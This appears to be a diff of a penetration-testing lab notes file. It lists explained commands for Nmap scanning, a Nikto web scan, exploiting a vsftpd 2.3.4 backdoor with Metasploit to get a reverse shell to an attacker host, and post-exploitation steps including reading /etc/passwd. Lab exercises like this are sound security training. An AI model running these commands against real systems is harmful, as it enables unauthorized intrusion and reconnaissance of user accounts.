@@ -1,33 +1,33 @@
 COMMANDS USED:
 1. nmap -sn 192.168.77.128
-	Performs host discovery (ping scan) to check whether the target machine is live.
+	Performs host discovery (ping scan) to check whether the target machine is live.
 2. nmap 192.168.77.128
-	Performs basic port scanning to identify open ports and exposed services.
+	Performs basic port scanning to identify open ports and exposed services.
 3. nmap -sV 192.168.77.128
-	Detects service versions running on open ports for vulnerability identification.
+	Detects service versions running on open ports for vulnerability identification.
 4. nmap --script vuln 192.168.77.128
-	Runs Nmap vulnerability scripts to identify known vulnerabilities and misconfigurations.
+	Runs Nmap vulnerability scripts to identify known vulnerabilities and misconfigurations.
 5. nmap --script smb-vuln* -p 445 192.168.77.128
-	Checks SMB service for known vulnerabilities on port 445.
+	Checks SMB service for known vulnerabilities on port 445.
 6. nikto -h http://192.168.77.128
-	Scans the web server for outdated software, misconfigurations, and web vulnerabilities.
+	Scans the web server for outdated software, misconfigurations, and web vulnerabilities.
 7. msfconsole
-	Launches the Metasploit Framework for exploitation testing.
+	Launches the Metasploit Framework for exploitation testing.
 8. use exploit/unix/ftp/vsftpd_234_backdoor
-	Selects the Metasploit module targeting the vulnerable vsftpd 2.3.4 service.
+  Selects the Metasploit module targeting the vulnerable vsftpd 2.3.4 service.
 9. set RHOSTS 192.168.77.128
-	Sets the target machine IP address for exploitation.
+	Sets the target machine IP address for exploitation.
 10. set LHOST 192.168.77.129
-	Sets the attacker machine IP address to receive the reverse shell connection.
+	Sets the attacker machine IP address to receive the reverse shell connection.
 11. run
-	Executes the exploit against the target system.
+	Executes the exploit against the target system.
 12. meterpreter > shell
-	Opens an interactive command shell on the compromised target machine.
+	Opens an interactive command shell on the compromised target machine.
 13. whoami
-	Displays the current user privileges on the target system.
+	Displays the current user privileges on the target system.
 14. pwd
-	Shows the current working directory on the compromised machine.
+	Shows the current working directory on the compromised machine.
 15. ls
-	Lists files and directories available in the current location.
+	Lists files and directories available in the current location.
 16. cat /etc/passwd
-	Displays system user account information for post-exploitation enumeration.
+	Displays system user account information for post-exploitation enumeration.
